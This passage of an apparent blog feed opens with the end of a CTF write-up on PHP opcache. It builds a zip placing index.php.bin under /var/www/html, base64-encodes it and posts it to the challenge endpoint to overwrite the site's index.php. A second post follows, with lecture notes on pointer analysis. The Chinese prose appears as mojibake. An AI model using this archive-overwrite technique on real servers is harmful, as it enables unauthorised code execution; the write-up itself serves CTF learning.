cp</p></blockquote><p>æœ€åæ”¾å…¥ç›®å½• 8131f93e8d92a77c0a8ff12ef84b05b1&#x2F;var&#x2F;www&#x2F;htmlå†…ï¼Œå°†ç›®å½•<code>8131f93e8d92a77c0a8ff12ef84b05b1</code>æ‰“åŒ…æˆyou_can_write.zipå†™å…¥</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(base) âœ ğŸ¥£ desktop zip -r ./you_can_write.zip ./8131f93e8d92a77c0a8ff12ef84b051</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/ (stored 0%)</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/.DS_Store (deflated 89%)</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/var/ (stored 0%)</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/var/.DS_Store (deflated 89%)</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/var/www/ (stored 0%)</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/var/www/.DS_Store (deflated 94%)</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/var/www/html/ (stored 0%)</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/var/www/html/.DS_Store (deflated 96%)</span><br><span class="line">  adding: 8131f93e8d92a77c0a8ff12ef84b05b1/var/www/html/index.php.bin (deflated 68%)</span><br><span class="line">(base) âœ ğŸ¥£ desktopcat you_can_write.zip|base64</span><br><span class="line">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</span><br></pre></td></tr></table></figure></div><p>å°†ä¸Šé¢æ•°æ®å†™å…¥you_can_write.zip   </p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/final_challenge_.php?key=dgdr_09hsqhy8&amp;action=1365</span><br><span class="line">post: data=.......</span><br></pre></td></tr></table></figure></div><p>ä¹‹åè§£å‹  &#x2F;final_challenge_.php?key&#x3D;dgdr_09hsqhy8&amp;action&#x3D;3</p><p>æ­¤æ—¶å†è®¿é—®é¢˜ç›®çš„index.phpï¼Œå·²ç»è¢«è¦†ç›–</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230243579.png"                      alt="image-20230809071031779"                ><figcaption>image-20230809071031779</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202408230243021.png"                      alt="image-20230809074242084"                ><figcaption>image-20230809074242084</figcaption></figure></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> opcache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è½¯ä»¶åˆ†æ-æŒ‡é’ˆåˆ†æ</title>
      <link href="/2023/10/17/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90/"/>
      <url>/2023/10/17/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="æŒ‡é’ˆåˆ†æ"><a href="#æŒ‡é’ˆåˆ†æ" class="headerlink" title="æŒ‡é’ˆåˆ†æ"></a>æŒ‡é’ˆåˆ†æ</h1><h2 id="Foundations"><a href="#Foundations" class="headerlink" title="Foundations"></a>Foundations</h2><h3 id="rules"><a href="#rules" class="headerlink" title="rules"></a>rules</h3><p>æŒ‡é’ˆåˆ†æéœ€è¦å…³æ³¨çš„åŸŸ</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222337482.png"                      alt="image-20231029160720840"                ><figcaption>image-20231029160720840</figcaption></figure></p><ul><li>å˜é‡ V</li><li>å±æ€§ F</li><li>å¯¹è±¡ O</li><li>å¯¹è±¡çš„æˆå‘˜å±æ€§ </li><li>æŒ‡é’ˆ åŒ…æ‹¬å˜é‡+å¯¹è±¡çš„field</li></ul><h4 id="å¤„ç†è§„åˆ™"><a href="#å¤„ç†è§„åˆ™" class="headerlink" title="å¤„ç†è§„åˆ™"></a>å¤„ç†è§„åˆ™</h4><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222337583.png"                      alt="image-20231029162403026"                ><figcaption>image-20231029162403026</figcaption></figure></p><blockquote><p>æ¨ªçº¿ä¸Šæ˜¯å‰ææ¡ä»¶ï¼Œä¸‹é¢æ˜¯æ¨åˆ°å‡ºçš„</p></blockquote><ul><li>New ç›´æ¥æŠŠxæŒ‡å‘oi</li><li>Assign yæŒ‡å‘çš„åŠ å…¥xçš„é›†åˆ</li><li>Store xæŒ‡å‘oiï¼ŒyæŒ‡å‘ojï¼ŒåŒæ—¶æŠŠyå­˜åˆ°x.fé‡Œï¼Œå°±æŠŠojæŒ‡åˆ°oi.f</li><li>Load xæŒ‡å‘oiï¼ŒæŠŠx.fèµ‹å€¼ç»™yï¼Œä¸”oi.fæŒ‡å‘ojï¼Œå°±æŠŠyæŒ‡åˆ°oj</li></ul><h2 id="implement"><a href="#implement" class="headerlink" title="implement"></a>implement</h2><p>ä¸»è¦éƒ¨åˆ†ï¼šåœ¨æŒ‡é’ˆä¹‹é—´äº’ç›¸ä¼ æ’­</p><h4 id="å…³é”®ï¼šå½“ä¸€ä¸ªæŒ‡é’ˆé›†åˆå˜åŒ–ã€æ›´æ–°æ—¶ï¼Œè¦æŠŠå˜åŒ–çš„éƒ¨åˆ†ä¼ æ’­ç»™ä¸å®ƒç›¸å…³çš„å…¶ä»–æŒ‡é’ˆ"><a href="#å…³é”®ï¼šå½“ä¸€ä¸ªæŒ‡é’ˆé›†åˆå˜åŒ–ã€æ›´æ–°æ—¶ï¼Œè¦æŠŠå˜åŒ–çš„éƒ¨åˆ†ä¼ æ’­ç»™ä¸å®ƒç›¸å…³çš„å…¶ä»–æŒ‡é’ˆ" class="headerlink" title="å…³é”®ï¼šå½“ä¸€ä¸ªæŒ‡é’ˆé›†åˆå˜åŒ–ã€æ›´æ–°æ—¶ï¼Œè¦æŠŠå˜åŒ–çš„éƒ¨åˆ†ä¼ æ’­ç»™ä¸å®ƒç›¸å…³çš„å…¶ä»–æŒ‡é’ˆ"></a>å…³é”®ï¼šå½“ä¸€ä¸ªæŒ‡é’ˆé›†åˆå˜åŒ–ã€æ›´æ–°æ—¶ï¼Œè¦æŠŠå˜åŒ–çš„éƒ¨åˆ†ä¼ æ’­ç»™ä¸å®ƒç›¸å…³çš„å…¶ä»–æŒ‡é’ˆ</h4><h3 id="PFG-æŒ‡é’ˆæµå›¾"><a href="#PFG-æŒ‡é’ˆæµå›¾" class="headerlink" title="PFG æŒ‡é’ˆæµå›¾"></a>PFG æŒ‡é’ˆæµå›¾</h3><p>æœ‰å‘å›¾</p><p>èŠ‚ç‚¹ï¼šç¨‹åºä¸­çš„æŒ‡é’ˆ</p><p>è¾¹ï¼šæŒ‡é’ˆæŒ‡å‘çš„å¯¹è±¡åœ¨æŒ‡é’ˆé—´çš„æµåŠ¨</p><h3 id="PFGå»ºè¾¹"><a href="#PFGå»ºè¾¹" class="headerlink" title="PFGå»ºè¾¹"></a>PFGå»ºè¾¹</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222337834.png"                      alt="image-20231029172931068"                ><figcaption>image-20231029172931068</figcaption></figure></p><ul><li>premises   c-&gt;oi  d-&gt;oi</li><li>a&#x3D;b   a&lt;-b</li><li>c.f&#x3D;a    oi.f&lt;-a  </li><li>d&#x3D;c   d&lt;-c</li><li>c.f&#x3D;d   d-&gt;oi.f</li><li>e&#x3D;d.f  oi.f-&gt;e</li></ul><blockquote><p>ä¸€ä¸ªè¾¹åªè¡¨ç¤ºä¸€æ­¥çš„çš„ä¼ æ’­</p><p>æŒ‡é’ˆåˆ†æè¦åœ¨å›¾ä¸Šæ‰¾ä¼ é€’é—­åŒ…</p></blockquote><h3 id="algorithmâ€“åªæœ‰newå’Œassignçš„æƒ…å†µ"><a href="#algorithmâ€“åªæœ‰newå’Œassignçš„æƒ…å†µ" class="headerlink" title="algorithmâ€“åªæœ‰newå’Œassignçš„æƒ…å†µ"></a>algorithmâ€“åªæœ‰newå’Œassignçš„æƒ…å†µ</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222337351.png"                      alt="image-20231029174120726"                ><figcaption>image-20231029174120726</figcaption></figure></p><h4 id="ç›¸å…³æ•°æ®ç»“æ„"><a href="#ç›¸å…³æ•°æ®ç»“æ„" class="headerlink" title="ç›¸å…³æ•°æ®ç»“æ„"></a>ç›¸å…³æ•°æ®ç»“æ„</h4><ul><li>WLï¼šå¾…å¤„ç†çš„é¡¹<ul><li>ç›¸å½“äºpairçš„Listï¼Œ&lt;pointer,P(O)&gt;,å‰é¢æ˜¯æŒ‡é’ˆï¼Œåé¢æ˜¯æŒ‡æŸä¸ªé›†åˆ</li></ul></li><li>PFGï¼šç®—æ³•ä¸­è¡¨ç¤ºæˆäº†è¾¹çš„é›†åˆ</li><li>Sè¾“å…¥çš„è¯­å¥</li></ul><h4 id="å·¦è¾¹çš„ä¸»ç®—æ³•"><a href="#å·¦è¾¹çš„ä¸»ç®—æ³•" class="headerlink" title="å·¦è¾¹çš„ä¸»ç®—æ³•"></a>å·¦è¾¹çš„ä¸»ç®—æ³•</h4><ul><li><p>é¦–å…ˆå¤„ç†newè¯­å¥ï¼Œç›´æ¥åŠ åˆ°WLé‡Œé¢</p></li><li><p>å†å¤„ç†assignè¯­å¥ï¼Œç›¸å½“äºå¾€PFGé‡ŒåŠ è¾¹</p><ul><li>åŠ è¾¹æ˜¯éœ€è¦æ³¨æ„æ›´æ–°workList</li><li>æ›´æ–°çš„è§„åˆ™ï¼Œæ¯”å¦‚æ–°å¢è¾¹æ˜¯s-&gt;tï¼Œå¦‚æœsæŒ‡å‘çš„é›†åˆptï¼ˆsï¼‰ä¸ä¸ºç©ºï¼Œåˆ™è¦åœ¨worklisté‡Œé¢åŠ ä¸Šï¼Œ&lt;t,Pt(s)&gt;  ï¼ˆsæŒ‡å‘çš„å¯¹è±¡ä¼šæµå‘tæŒ‡é’ˆï¼‰</li></ul></li><li><p>å¯¹WLçš„å¤„ç†</p><ul><li><p>æ¯æ¬¡å–ä¸€ä¸ªpair ï¼Œå–å‡º&lt;n,pts&gt;ï¼Œå…ˆåˆ é™¤ptsé›†åˆä¸­ä¸næŒ‡é’ˆæŒ‡å‘çš„é›†åˆé‡å¤çš„å…ƒç´ ï¼ŒæŠŠå¾—åˆ°çš„é›†åˆä¼ åˆ°propgateå‡½æ•°ä¸­ï¼ŒåŒæ—¶è¿˜è¦æŠŠnæŒ‡é’ˆä¼ è¿›å»</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222338428.png"                      alt="image-20231029175417544"                ><figcaption>image-20231029175417544</figcaption></figure></p></li><li><p>prpgateå‡½æ•°ï¼šé¦–å…ˆæ‹“å±•næŒ‡é’ˆæŒ‡å‘çš„é›†åˆï¼Œå†æŠŠnçš„æ‰€æœ‰åç»§æ‰¾å‡ºæ¥ï¼ŒæŠŠptsåŠ å…¥ä»–ä»¬æŒ‡å‘çš„é›†åˆï¼ˆå…ˆï¼‰</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222338173.png"                      alt="image-20231029175627084"                ><figcaption>image-20231029175627084</figcaption></figure></p></li></ul></li></ul><blockquote><p>æ·»åŠ äº†è®¡ç®—å·®é›†çš„åŸå› ï¼šå·®é›†æ˜¯çœŸæ­£è¦ä¼ æ’­çš„ï¼Œè¿™æ ·åšå¯ä»¥é¿å…å†—ä½™æ“ä½œ</p></blockquote><h3 id="algorithmâ€“storeå’Œloadçš„æƒ…å†µ"><a href="#algorithmâ€“storeå’Œloadçš„æƒ…å†µ" class="headerlink" title="algorithmâ€“storeå’Œloadçš„æƒ…å†µ"></a>algorithmâ€“storeå’Œloadçš„æƒ…å†µ</h3><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222338341.png"                      alt="image-20231030195356238" style="zoom:50%;"                 ><figcaption>image-20231030195356238</figcaption></figure><ul><li>store<ul><li>AddEdge</li><li>x.f&#x3D;y  oi.f&lt;-y</li><li>çº¢æ¡†çš„éƒ¨åˆ†ä¸ä¸€å®šä¼šåœ¨PFGé‡Œé¢åŠ å…¥æ–°çš„è¾¹<ul><li>è™½ç„¶å› ä¸ºx.f&#x3D;yè¦åŠ å…¥oi.f &lt;- yè¿™æ¡è¾¹ï¼Œä½†å¯èƒ½ä¹‹å‰æœ‰å¦ä¸€ä¸ªå˜é‡aä¹ŸæŒ‡å‘oiï¼Œæ‰€ä»¥oi.f &lt;- yå¯èƒ½ä¹‹å‰å°±åŠ è¿‡äº†</li></ul></li></ul></li><li>load<ul><li>AddEdge</li><li>y&#x3D;x.f  y&lt;-oi.f</li><li>ä¹Ÿæœ‰ä¸Šé¢è¯´çš„é—®é¢˜</li></ul></li></ul><h3 id="algorithmâ€“æ€»ä½“"><a href="#algorithmâ€“æ€»ä½“" class="headerlink" title="algorithmâ€“æ€»ä½“"></a>algorithmâ€“æ€»ä½“</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222338789.png"                      alt="image-20231030200607462"                ><figcaption>image-20231030200607462</figcaption></figure></p><h3 id="ä¸€ä¸ªä¾‹å­"><a href="#ä¸€ä¸ªä¾‹å­" class="headerlink" title="ä¸€ä¸ªä¾‹å­"></a>ä¸€ä¸ªä¾‹å­</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 b = new C();</span><br><span class="line">2 a = b;</span><br><span class="line">3 c = new C();</span><br><span class="line">4 c.f = a;</span><br><span class="line">5 d = c;</span><br><span class="line">6 c.f = d;</span><br><span class="line">7 e = d.f;</span><br></pre></td></tr></table></figure></div><blockquote><p>oiè¡¨ç¤ºæ˜¯ç¬¬iä¸ªè¯­å¥ä¸­çš„å¯¹è±¡</p></blockquote><ol><li>å…ˆå¤„ç†newè¯­å¥<ul><li>b&#x3D;new C   &lt;b,{o1}&gt;</li><li>c&#x3D;new C   &lt;c,{o3}&gt;</li><li>ä¸Šé¢ä¸¤ä¸ªéƒ½åŠ åˆ°WLé‡Œé¢å»</li></ul></li><li>å¤„ç†Assignè¯­å¥<ul><li>a&#x3D;b a{}&lt;-b{}</li><li>d&#x3D;c d{}&lt;-c{}</li></ul></li><li>å¤„ç†WLï¼ˆéœ€è¦çœ‹æˆæ˜¯é˜Ÿåˆ—ï¼Œå…ˆè¿›å…ˆå‡ºï¼‰<ul><li>å¤„ç†&lt;b,{o1}&gt;  a{}&lt;-b{o1} &lt;a,{o1}&gt;åŠ å…¥WL</li><li>å¤„ç†&lt;c,{o3}&gt;  d{}&lt;-c{o3} &lt;d,{o3}&gt;åŠ å…¥WL<ul><li>ç”±äºå­˜åœ¨c.fï¼Œè¦ç»§ç»­å¤„ç†load&#x2F;store c.f&#x3D;a  c.f&#x3D;d</li><li>åŠ è¾¹ o3.f{}&lt;-a{}   o3.f{}&lt;-d{}</li></ul></li><li>å¤„ç†&lt;a,{o1}&gt;  &lt;o3.f,{o1}&gt;åŠ å…¥WL</li><li>å¤„ç†&lt;d,{o3}&gt;  &lt;o3.f,{o3}&gt;åŠ å…¥WL<ul><li>då˜é‡å­˜åœ¨load  e&#x3D;d.f  åŠ è¾¹o3.f-&gt;e</li></ul></li><li>å¤„ç†&lt;o3.f,{o1}&gt;  &lt;e,{o1}&gt;ä¹ŸåŠ å…¥WL</li><li>å¤„ç†&lt;o3.f,{o3}&gt;  &lt;e,{o3}&gt;ä¹ŸåŠ å…¥WL</li><li>å¤„ç†&lt;e,{o1}&gt; ç›´æ¥æ”¹é›†åˆ</li><li>å¤„ç†&lt;e,{o3}&gt; ç›´æ¥æ”¹é›†åˆ</li></ul></li></ol><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222338856.png"                      alt="image-20231030202638246" style="zoom:50%;"                 ><figcaption>image-20231030202638246</figcaption></figure><h2 id="æ–¹æ³•è°ƒç”¨"><a href="#æ–¹æ³•è°ƒç”¨" class="headerlink" title="æ–¹æ³•è°ƒç”¨"></a>æ–¹æ³•è°ƒç”¨</h2><p>é’ˆå¯¹çš„æ˜¯åœ¨é‚£äº›æ–¹æ³•ä¸­çš„å˜é‡ï¼Œç”±äºæ–¹æ³•åœ¨ä¸åŒåœ°æ–¹è°ƒç”¨ä¸åŒï¼ŒåŒæ—¶ä¼ å…¥çš„å‚æ•°ä¹Ÿä¸åŒï¼Œè¿™ä½¿å¾—å¤„ç†æ–¹æ³•è°ƒç”¨æ¯”è¾ƒéº»çƒ¦</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222339449.png"                      alt="image-20231030203317349" style="zoom:50%;"                 ><figcaption>image-20231030203317349</figcaption></figure><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222339433.png"                      alt="image-20231031101934668"                ><figcaption>image-20231031101934668</figcaption></figure></p><ol><li><p>dispatchæ‰¾åˆ°çœŸæ­£è°ƒç”¨çš„æ–¹æ³•</p><ul><li>å’ŒCHAçš„ç±»ä¼¼</li><li>æ‰¾åˆ°ç›®æ ‡æ–¹æ³•ï¼Œå­˜åˆ°å˜é‡mé‡Œ</li></ul></li><li><p>ä¼ receiver object 